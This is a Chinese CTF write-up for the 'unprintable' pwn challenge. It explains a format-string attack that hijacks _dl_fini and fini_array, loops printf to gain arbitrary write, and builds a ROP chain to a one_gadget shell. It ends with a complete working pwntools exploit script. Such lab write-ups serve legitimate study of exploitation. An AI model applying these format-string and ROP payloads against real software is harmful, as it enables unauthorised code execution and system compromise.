[中文](./README_zh.md) [English](./README.md)

[附件](./attachment.zip)

这题其实是pwnable tw上printable一道题的变种

理论上可以不用打印栈地址出来，只要预测栈后三位就可以了

首先是劫持控制流，栈上面残留了一个ld.so的地址

在exit的时候会执行dl_fini函数，里面有一段比较有趣的片段

```
<_dl_fini+819>:	call   QWORD PTR [r12+rdx*8]
```

rdx固定为0，r12来自下面的代码片段

```
<_dl_fini+777>:	mov    r12,QWORD PTR [rax+0x8]
<_dl_fini+781>:	mov    rax,QWORD PTR [rbx+0x120]
<_dl_fini+788>:	add    r12,QWORD PTR [rbx]
```

rbx指向的刚好就是栈上残留的ld.so的地址，因此我们可以控制\[rbx]的值

r12默认指向的是fini_array，通过控制rbx，我们可以让r12指向bss，也就是我们可以劫持控制流了

但是劫持控制流之后呢？

我们可以再跳回main函数

```
.text:00000000004007A3                 mov     edx, 1000h      ; nbytes
.text:00000000004007A8                 mov     esi, offset buf ; buf
.text:00000000004007AD                 mov     edi, 0          ; fd
.text:00000000004007B2                 call    read
```

再次读内容到bss段，再printf出来

如果比较细心的话，可以发现这个时候栈上第23个参数刚好指向的是printf的返回地址，也就是我们可以在printf之后再跳回0x4007A3，也就是能无限循环printf

有了无限循环printf，那么就和平常的有循环的printf一样做了

这个时候我们就有了任意写，可以写栈上printf返回地址后面的内容，写一个bss段的地址，再配合 pop rsp这个gadget就可以进行rop了

这里还有一个小坑，就是printf超过0x2000个字节之后用 %hn 写不了值，所以要爆破到适合的栈地址，不过概率也挺高的

有了rop之后呢？我们还是leak不了，这个时候可以借助一个神奇的gadget

```
.text:00000000004006E8                 adc     [rbp+48h], edx
```
rbp和edx我们都是可以控制的，刚好bss段中有stdin,stdout,sterr这几个值，指向的是libc

所以我们可以利用这个gadget将stderr改成one_gadget，再利用__libc_csu_init中的
```
call    qword ptr [r12+rbx*8]
```
就可以get shell了

get shell之后就挺简单了，利用重定向拿flag

```
cat flag >&0
```

## exp
```
from pwn import *

debug=1

context.log_level='debug'

if debug:
    p=process('./unprintable')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
else:
    p=remote('',)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def wait(x=True):
    #raw_input()
    sleep(0.3)

def write_addr(addr,sz=6):
    t = (stack+0x40)%0x100
    v = p64(addr)
    for i in range(sz):
        if t+i != 0:
            se('%'+str(t+i)+'c%18$hhn%'+str(1955-t-i)+'c%23$hn\x00')
        else:
            se('%18$hhn%1955c%23$hn')
        wait()
        tv = ord(v[i])
        if tv != 0:
            se('%'+str(tv)+'c%13$hhn%'+str(1955-tv)+'c%23$hn\x00')
        else:
            se('%13$hhn%1955c%23$hn')
        wait()

def write_value(addr,value,addr_sz=6):
    write_addr(addr,addr_sz)
    se('%'+str(ord(value[0]))+'c%14$hhn%'+str(1955-ord(value[0]))+'c%23$hn\x00')
    wait()
    ta = p64(addr)[1]
    for i in range(1,len(value)):
        tmp = p64(addr+i)[1]
        if ta!=tmp:
            write_addr(addr+i,2)
            ta = tmp
        else:
            write_addr(addr+i,1)
        if ord(value[i]) !=0:
            se('%'+str(ord(value[i]))+'c%14$hhn%'+str(1955-ord(value[i]))+'c%23$hn\x00')
        else:
            se('%14$hhn%1955c%23$hn\x00')
        wait()

buf = 0x601060+0x100+4

ru('This is your gift: ')
stack = int(ru('\n'),16)-0x118

if stack%0x10000 > 0x2000:
    p.close()
    exit()

ret_addr = stack - 0xe8

se('%'+str(buf-0x600DD8)+'c%26$hn'.ljust(0x100,'\x00')+p64(0x4007A3))
wait()

tmp = (stack+0x40)%0x10000

se('%c'*16+'%'+str(tmp-16)+'c%hn%'+str((163-(tmp%0x100)+0x100)%0x100)+'c%23$hhn\x00')

wait()

if debug:
    gdb.attach(p)

raw_input()

rop = 0x601060+0x200

write_value(stack,p64(rop)[:6])


context.arch = 'amd64'

prbp = 0x400690
prsp = 0x40082d
adc = 0x4006E8
arsp = 0x0400848
prbx = 0x40082A 
call = 0x400810 
stderr = 0x601040 

payload = p64(arsp)*3
payload += flat(prbx,0,stderr-0x48,rop,0xFFD2BC07,0,0,call)
payload += flat(adc,0,prbx,0,0,stderr,0,0,0,0x400819)

se(('%'+str(0x82d)+'c%23$hn').ljust(0x200,'\0')+payload)

print(hex(stack))

p.interactive()
```